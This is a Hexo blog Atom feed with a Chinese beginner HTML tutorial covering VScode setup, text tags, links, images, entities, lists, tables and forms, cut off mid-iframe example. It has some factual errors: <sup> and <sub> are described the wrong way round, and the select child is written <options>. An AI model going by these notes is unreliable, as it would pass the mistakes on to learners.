<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>忆 执 昔 来 的 旅 途</title>
  
  
  <link href="https://xizhi-future.github.io/atom.xml" rel="self"/>
  
  <link href="https://xizhi-future.github.io/"/>
  <updated>2021-11-19T08:46:59.665Z</updated>
  <id>https://xizhi-future.github.io/</id>
  
  <author>
    <name>xizhi-future</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HTML基础全</title>
    <link href="https://xizhi-future.github.io/2021/11/19/HTML%E5%9F%BA%E7%A1%80%E5%85%A8/"/>
    <id>https://xizhi-future.github.io/2021/11/19/HTML%E5%9F%BA%E7%A1%80%E5%85%A8/</id>
    <published>2021-11-19T08:45:05.000Z</published>
    <updated>2021-11-19T08:46:59.665Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="HTML-创建站点-–-环境：VScode"><a href="#HTML-创建站点-–-环境：VScode" class="headerlink" title="HTML 创建站点 – 环境：VScode"></a>HTML 创建站点 – 环境：VScode</h2><p><strong>创建站点</strong>：包含基本文件<br><img src="https://img-blog.csdnimg.cn/20210109140819801.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210109140831761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>VScode 配置</strong></p><p><strong>插件安装：</strong><br><img src="https://img-blog.csdnimg.cn/20210109141233418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>插件<br><img src="https://img-blog.csdnimg.cn/20210109141124299.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210109141134688.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210109141149567.png" alt="在这里插入图片描述"><br><strong>将文件夹添加至工作区：</strong></p><p>文件 – 将文件夹添加到工作区 – 选择文件夹<br><img src="https://img-blog.csdnimg.cn/20210109141811698.png" alt="在这里插入图片描述"><br><strong>新建 html 文档 ：</strong></p><p>工作区选中文件夹中，Ctrl + N –&gt; Ctrl + S –&gt; 设置文件夹名，后缀为 .html 或者 .htm</p><h2 id="HTML基本架构："><a href="#HTML基本架构：" class="headerlink" title="HTML基本架构："></a>HTML基本架构：</h2><p>先输入一个 ! 号，然后按一下 Tab 键即可<br><img src="https://img-blog.csdnimg.cn/20210109142316620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>基本架构理解</strong></p><p><img src="https://img-blog.csdnimg.cn/20210109144116916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="HTML（二）-概述-常用标签-转义字符"><a href="#HTML（二）-概述-常用标签-转义字符" class="headerlink" title="HTML（二） 概述+常用标签+转义字符"></a>HTML（二） 概述+常用标签+转义字符</h2><p><strong>(HyperText Markup Language)–超文本标记语言</strong></p><p>1.用于编写网页，是一种<strong>解释型</strong>(写出来的代码即可直接进行运行,不需要编译)的语言<br>2.其源文件是纯文本的，放在web根目录之下<br>3.HTML是一种 <strong>标记语言</strong>，后缀名为  <strong>.html</strong>  或者是 <strong>.htm</strong><br>4.语法构成：<strong>标签+属性</strong>，即尖括号后开头为<strong>标签</strong>，标签中可设置 <strong>属性</strong> 以及 <strong>属性值</strong>，<br>属性值放于引号中，不同属性用空格隔开<br>5.HTML的运行环境是 <strong>浏览器</strong><br>6.<strong>注释</strong>：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">注释的内容</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><blockquote><p>拓展：<br>1.C语言源代码–&gt;<strong>编译</strong>–&gt;二进制文件–&gt;计算机解释执行<br>Java同上<br>2.HTML标签分为：单标签(空标签，没有结束标签)，双标签(成对出现)</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">导入 CSS 文件：</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;**.css&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">导入 JS 文件：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/**.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">CSS 代码：</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span>嵌入css样式代码<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">JS 代码：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>...<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>文本标签</strong></p><p><strong>标题标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span> <span class="tag">&lt;/<span class="name">h1</span>&gt;</span>     特点:其样式均为默认状态，即文本大小的设置，以及加粗设置</span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span> <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span> <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span> <span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span> <span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span> <span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注：</span><br><span class="line"><span class="number">1</span>.&lt;<span class="selector-tag">h1</span>&gt;&lt;/<span class="selector-tag">h1</span>&gt;标签在一个网页中最好只用一次</span><br><span class="line"><span class="number">2</span>.这六个标题标签不能互相嵌套</span><br></pre></td></tr></table></figure><p><strong>文本相关设置标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span>        倾斜</span><br><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">em</span>&gt;</span>   强调斜体</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span>        加粗</span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">u</span>&gt;</span><span class="tag">&lt;/<span class="name">u</span>&gt;</span>        下划线</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">sup</span>&gt;</span><span class="tag">&lt;/<span class="name">sup</span>&gt;</span>    下标</span><br><span class="line"><span class="tag">&lt;<span class="name">sub</span>&gt;</span><span class="tag">&lt;/<span class="name">sub</span>&gt;</span>    上标</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>        段落</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>  字符 或 小段文本 标签，是 行内元素</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>          一个块，作容器，用于网页布局，是 块级元素</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">font</span>&gt;</span>  字体设置  </span><br><span class="line">    size</span><br><span class="line">    color</span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span>         水平线</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>         换行</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">del</span>&gt;</span><span class="tag">&lt;/<span class="name">del</span>&gt;</span>   删除线</span><br><span class="line"> </span><br><span class="line">A<span class="tag">&lt;<span class="name">sup</span>&gt;</span>2<span class="tag">&lt;/<span class="name">sup</span>&gt;</span>下标</span><br><span class="line">    </span><br><span class="line">B<span class="tag">&lt;<span class="name">sup</span>&gt;</span>2<span class="tag">&lt;/<span class="name">sup</span>&gt;</span>上标</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注：</span><br><span class="line"><span class="number">1</span>.&lt;<span class="selector-tag">p</span>&gt;&lt;/<span class="selector-tag">p</span>&gt;标签中不能嵌套标题标签</span><br></pre></td></tr></table></figure><blockquote><p>扩展：**&lt; span &gt;与&lt; div &gt;**<br><strong>行内元素</strong>：一个行内元素只占据它对应标签的边框所包含的空间<br><strong>块级元素</strong>：块级元素占据其父元素（容器）的整个空间，创建了一个“<strong>块</strong>”，一般浏览器会在块级元素后另起一个新行。</p></blockquote><p><strong>超链接</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>  属性：</span><br><span class="line">         href=&quot;&quot;   跳转的路径</span><br><span class="line">         target=&quot;&quot;，属性值：</span><br><span class="line">_self(默认值，覆盖当前页面)；</span><br><span class="line">_blank(将会新弹出一个窗口)</span><br><span class="line">_parent 父窗口</span><br><span class="line">_top  顶级窗口</span><br><span class="line">_framename  窗口名</span><br><span class="line">         title=&quot;&quot;  提示信息</span><br><span class="line">         rel=&quot;nofollow&quot;</span><br></pre></td></tr></table></figure><p>扩展</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">空链接         &lt;<span class="selector-tag">a</span> href=&quot;#&quot;&gt;&lt;/<span class="selector-tag">a</span>&gt;   </span><br><span class="line"><span class="selector-tag">a</span> 模拟按钮     &lt;<span class="selector-tag">a</span> href=&quot;javascript:<span class="built_in">void</span>(<span class="number">0</span>)<span class="string">&quot;&gt;按钮&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p><strong>img 标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>&gt;</span>    属性：</span><br><span class="line">         src=&quot;&quot;   图片路径</span><br><span class="line">         alt=&quot;&quot;   当图片未正常加载出来时，将会显示alt中的文本替换图片 </span><br><span class="line">                  利于SEO优化，由于搜索引擎无法读取图片上面的文本</span><br><span class="line">         title=&quot;&quot; 提示信息</span><br><span class="line">         </span><br><span class="line">         width=&quot;&quot;  长</span><br><span class="line">         height=&quot;&quot; 宽</span><br><span class="line">         border=&quot;&quot; 边框</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注：</span><br><span class="line">绝对路径： http://www.baidu.com</span><br><span class="line">相对路径：<span class="number">1</span>.jpg  ./<span class="number">1</span>.jpg   当前</span><br><span class="line">        ./images/<span class="number">1</span>.jpg   下一级</span><br><span class="line">        ../i.jpg         上一级</span><br></pre></td></tr></table></figure><p><strong>特殊字符 (转义字符)：</strong><br>| 结果 | 实体名称 |<br>| —- | ——– |<br>| 空格 | &amp;nbsp    |<br>| &lt;    | &amp;lt      |<br>| &gt;    | &amp;gt      |<br>| &amp;    | &amp;amp     |<br>| “    | &amp;quot    |<br>| ‘    | &amp;apos    |<br>| ©    | &amp;copy    |</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如:输出  &lt;head&gt;    &amp;lt;head&amp;gt;</span><br></pre></td></tr></table></figure><blockquote><p><strong>HTML实体</strong>：<br>一些字符在 HTML 中是预留的，拥有特殊的含义，比如小于号‘&lt;’用于定义 HTML 标签的开始。如果我们希望浏览器正确地显示这些字符，我们必须在 HTML 源码中插入字符实体。分为ASCLL，符号实体，字符实体。</p></blockquote><p>多媒体标签，html5之后新增内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;./mus/1.mp3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span>=<span class="string">&quot;controls&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span> <span class="attr">loop</span> <span class="attr">poster</span>=<span class="string">&quot;./images/linux.jpg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;./mus/back.mp4&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;movie.webm&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/webm&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="HTML（三）列表-与-表格"><a href="#HTML（三）列表-与-表格" class="headerlink" title="HTML（三）列表 与 表格"></a>HTML（三）列表 与 表格</h2><p><strong>HTML 列表</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span>         无序列表：默认样式--实心列表符号</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  使用：新闻条，页面主导航，轮播图</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span>         有序列表：默认样式--数字顺序</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  使用：新闻条，页面主导航，轮播图</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  type属性：更改列表符号类型--a,A,i,I</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  start属性：控制列表符号开始位置，属性值只能为数字</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span>   </span><br><span class="line">     </span><br><span class="line">          </span><br><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span>         自定义列表</span><br><span class="line">  <span class="tag">&lt;<span class="name">dt</span>&gt;</span>放一个名词<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dd</span>&gt;</span>对该名词的解释<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dt</span>&gt;</span><span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p><strong>HTML 表格</strong></p><p><strong>表格标签：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span>        定义表格</span><br><span class="line">   <span class="tag">&lt;<span class="name">caption</span>&gt;</span>表格标题<span class="tag">&lt;/<span class="name">caption</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span>        定义行</span><br><span class="line">     <span class="tag">&lt;<span class="name">th</span>&gt;</span>表头1<span class="tag">&lt;/<span class="name">th</span>&gt;</span> 定义列</span><br><span class="line">     <span class="tag">&lt;<span class="name">th</span>&gt;</span>表头2<span class="tag">&lt;/<span class="name">th</span>&gt;</span>   table属性：</span><br><span class="line">   <span class="tag">&lt;/<span class="name">tr</span>&gt;</span>                  width=&quot;&quot;        宽</span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span>                   height=&quot;&quot;       高</span><br><span class="line">     <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>            border=&quot;&quot;       边框</span><br><span class="line">     <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>            bordercolor=&quot;&quot;  边框颜色</span><br><span class="line">   <span class="tag">&lt;/<span class="name">tr</span>&gt;</span>                  bgcolor=&quot;&quot;      背景颜色</span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span>                   cellspacing=&quot;0&quot; 边框间距</span><br><span class="line">     <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>            cellpadding=&quot;0&quot; 边框与内容之间的距离</span><br><span class="line">     <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>            align=&quot;&quot;         水平对齐方式,属性值：right,center,left</span><br><span class="line">   <span class="tag">&lt;/<span class="name">tr</span>&gt;</span>                  valign=&quot;&quot;        垂直对齐方式,属性值：top,middle,bottom</span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">合并单元格：均写在<span class="tag">&lt;<span class="name">td</span>&gt;</span>标签中,*和谁合并删掉谁       </span><br><span class="line">  colspan=&quot;数字&quot;   合并列 数字代表合并几个单元格</span><br><span class="line">  rowspan=&quot;数字&quot;   合并行 数字代表合并几个单元格</span><br><span class="line">合并列与合并行相结合：先合并列，再合并行</span><br><span class="line">对齐方式：</span><br><span class="line">  align=&quot;&quot;         水平对齐方式,属性值：right,center,left</span><br><span class="line">  valign=&quot;&quot;        垂直对齐方式,属性值：top,middle,bottom</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTML 表单中有两种类型的单元格：</span><br><span class="line"></span><br><span class="line">    表头单元格 - 包含表头信息（由 th 元素创建）</span><br><span class="line">    标准单元格 - 包含数据（由 td 元素创建）</span><br><span class="line"></span><br><span class="line">th 元素内部的文本通常会呈现为居中的粗体文本，而 td 元素内的文本通常是左对齐的普通文本</span><br></pre></td></tr></table></figure><h2 id="HTML（四）表单"><a href="#HTML（四）表单" class="headerlink" title="HTML（四）表单"></a>HTML（四）表单</h2><p>1.表单本身为一个框架，表单中有很多 <strong>控件（元素）</strong><br>2.本质：完成双向交互，向服务器提交信息，<strong>搜集用户信息</strong><br>3.表单的使用：搜索框，登录框，文件上传，注册，留言板等等</p><p><strong>表单标签：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">属性：</span><br><span class="line">     name=&quot;&quot;     表单的名称</span><br><span class="line">     action=&quot;&quot;   属性值为 &quot;接口地址&quot; 把数据提交到服务器的 URL</span><br><span class="line">                 如果为空则提交到当前页面，也可采用绝对路径与相对路径</span><br><span class="line">     method=&quot;&quot;   数据传输方式：&quot;get / post&quot;</span><br><span class="line"> enctype 提交类型</span><br><span class="line">当上传文件时，要写该属性，</span><br><span class="line">enctype=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">enctype=&quot;multipart/form-data&quot;</span><br><span class="line"> target 在何处打开目标 URL</span><br><span class="line">     </span><br><span class="line">表单内部元素： <span class="tag">&lt;<span class="name">input</span> &gt;</span></span><br></pre></td></tr></table></figure><p><strong>get 与 post</strong></p><blockquote><p>get 默认值，显示提交，长度限制2KB，向服务器索取数据<br>post ”安全隐式提交“，无长度限制，一般准备数据提交后服务器处理再交付<br>get 参数提交到URL中，在URL中有显示，且 URL长度有限制<br>       post 上传文件等  数据流  HTTP请求正文中</p></blockquote><p><strong>input 标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> &gt;</span></span><br><span class="line">属性：</span><br><span class="line">  type       决定 input 所生成的表单类型</span><br><span class="line">  value      作为 input 的值，根据 type 的不同而作用不同</span><br><span class="line">  maxlength  最大长度</span><br><span class="line">  size       以字符为单位控制input的大小</span><br><span class="line">  name 属性名</span><br></pre></td></tr></table></figure><p><strong>input标签 的 type 属性</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">password   密码框</span><br><span class="line">text       文本框</span><br><span class="line">radio      单选框 （性别 name 值必须相同才能是单选框）</span><br><span class="line">checkbox   复选框 </span><br><span class="line">reset      重置按钮 </span><br><span class="line">submit     提交按钮</span><br><span class="line"><span class="selector-tag">button</span>     空按钮</span><br><span class="line">file       文件域 </span><br><span class="line">hidden     隐藏内容 </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/13/MTyhaoeVqJmXt5w.png" alt="image-20211113175140020"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">enctype</span><br><span class="line">application/x-www-form-urlencoded    默认值</span><br><span class="line">multipart/form-data  上传文件时使用</span><br></pre></td></tr></table></figure><p> 文本域：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">cols</span>=<span class="string">&quot;&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><p> 下拉列表：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;select name=&quot;&quot; size=&quot;&quot;&gt;</span><br><span class="line">      &lt;options&gt; </span><br><span class="line">      </span><br><span class="line">      &lt;/options&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">disabled</span><br><span class="line">readonly</span><br></pre></td></tr></table></figure><p>页面的嵌套:<br>iframe：从一个页面中引入另一个页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">&quot;1.html&quot;</span> <span class="attr">target</span>=<span class="string">&quot;frame1&quot;</span>&gt;</span>1.html<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;frame1&quot;</span> <span class="attr">src</span>=<span class="string">&quot;1.html&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span 